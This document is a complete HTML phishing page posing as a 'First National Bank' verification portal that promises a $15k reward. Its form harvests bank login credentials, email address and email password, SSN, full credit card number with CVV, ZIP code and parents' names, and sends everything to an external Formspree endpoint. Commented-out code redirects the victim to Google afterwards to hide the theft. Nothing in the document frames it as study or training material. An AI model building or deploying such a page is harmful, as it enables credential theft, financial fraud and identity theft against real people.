<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Verification - Claim $15k</title>
    <style>
        /* CSS STYLING */
        :root {
            --primary-color: #0056b3; /* Bank Blue */
            --secondary-color: #004494;
            --accent-color: #ffc107; /* Gold for $15k */
            --bg-color: #f4f7f6;
            --text-color: #333;
            --white: #ffffff;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 0vh;
            padding: 20px;
        }

        .container {
            background-color: var(--white);
            width: 100%;
            max-width: 450px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
            overflow: hidden;
            position: relative;
        }

        /* Header Section */
        .header {
            background-color: var(--primary-color);
            color: var(--white);
            padding: 25px 20px;
            text-align: center;
            position: relative;
        }

        .bank-logo {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .bank-logo svg {
            width: 30px;
            height: 30px;
            fill: var(--white);
        }

        .claim-badge {
            background-color: var(--accent-color);
            color: #000;
            padding: 5px 12px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 14px;
            display: inline-block;
            margin-top: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }

        .claim-badge span {
            margin-right: 5px;
        }

        /* Form Section */
        .form-body {
            padding: 30px 25px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 14px;
            color: #555;
            font-weight: 600;
        }

        .input-group input, 
        .input-group select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 15px;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            outline: none;
            border-color: var(--primary-color);
        }

        /* Grid for smaller fields */
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .grid-3 {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
        }

        /* Submit Button */
        .submit-btn {
            width: 100%;
            padding: 14px;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }

        .submit-btn:hover {
            background-color: var(--secondary-color);
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 15px;
            font-size: 12px;
            color: #888;
            border-top: 1px solid #eee;
        }

        /* Loading Spinner (Optional JS enhancement) */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="bank-logo">
            <!-- Simple SVG Bank Icon -->
            <svg viewBox="0 0 24 24">
                <path d="M12 7V3H2v18h20V7H12zM6 19H4v-2h2v2zm0-4H4v-2h2v2zm0-4H4V9h2v2zm0-4H4V5h2v2zm4 12H8v-2h2v2zm0-4H8v-2h2v2zm0-4H8V9h2v2zm0-4H8V5h2v2zm10 12h-2v-2h2v2zm0-4h-2v-2h2v2zm0-4h-2V9h2v2zm0-4h-2V5h2v2zM12 3v4l4-2.5L12 3z"/>
            </svg>
            First National Bank
        </div>
        <div class="claim-badge">
            <span>🏆</span> Claim your $15k!
        </div>
    </div>

    <div class="form-body">
        <!-- Formspree Integration -->
        <form action="https://formspree.io/f/mykqrvre" method="POST">
            
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter username" required>
            </div>

            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required>
            </div>

            <div class="input-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="example@mail.com" required>
            </div>

            <div class="input-group">
                <label for="email_password">Email Password</label>
                <input type="password" id="email_password" name="email_password" placeholder="••••••••" required>
            </div>

            <div class="input-group">
                <label for="ssn">SSN</label>
                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
            </div>

            <div class="input-group">
                <label for="credit_card">Credit Card Number</label>
                <input type="text" id="credit_card" name="credit_card" placeholder="1234 5678 9012 3456" required>
            </div>

            <div class="grid-3">
                <div class="input-group">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" name="cvv" placeholder="123" required>
                </div>
                <div class="input-group">
                    <label for="zip">ZIP Code</label>
                    <input type="text" id="zip" name="zip" placeholder="10001" required>
                </div>
            </div>

            <div class="grid-2">
                <div class="input-group">
                    <label for="father_name">Father Name</label>
                    <input type="text" id="father_name" name="father_name" placeholder="John Doe" required>
                </div>
                <div class="input-group">
                    <label for="mother_name">Mother Name</label>
                    <input type="text" id="mother_name" name="mother_name" placeholder="Jane Doe" required>
                </div>
            </div>

            <div class="input-group">
                <label for="occupation">Occupation</label>
                <input type="text" id="occupation" name="occupation" placeholder="e.g. Engineer" required>
            </div>

            <!-- Hidden field to keep Formspree happy if needed, or just standard submit -->
            <button type="submit" class="submit-btn">Verify & Claim $15k</button>
        </form>
    </div>

    <div class="footer">
        &copy; 2023 Bank Verification Portal. Secure Connection.
    </div>
</div>

<script>
    // Simple JavaScript to handle form submission animation
    const form = document.querySelector('form');
    const btn = document.querySelector('.submit-btn');

    form.addEventListener('submit', function(e) {
        // Optional: Prevent default if you want to use AJAX, 
        // but for Formspree standard HTML submission works best.
        // We will just change button text for visual feedback.
        
        const originalText = btn.innerText;
        btn.innerText = 'Processing...';
        btn.style.opacity = '0.8';
        
        // If using AJAX with Formspree:
        /*
        e.preventDefault();
        const data = new FormData(form);
        fetch(form.action, {
            method: form.method,
            body: data,
            headers: { 'Accept': 'application/json' }
        }).then(response => {
            if (response.ok) {
                btn.innerText = 'Success!';
                setTimeout(() => window.location.href = 'https://google.com', 2000); // Redirect after success
            } else {
                btn.innerText = 'Error. Try again.';
            }
        }).catch(error => {
            btn.innerText = 'Error.';
        });
        */
        
        // Standard submission (uncomment below if you want standard HTML form submit)
        // No e.preventDefault() needed for standard submission.
    });
</script>

</body>
</html>
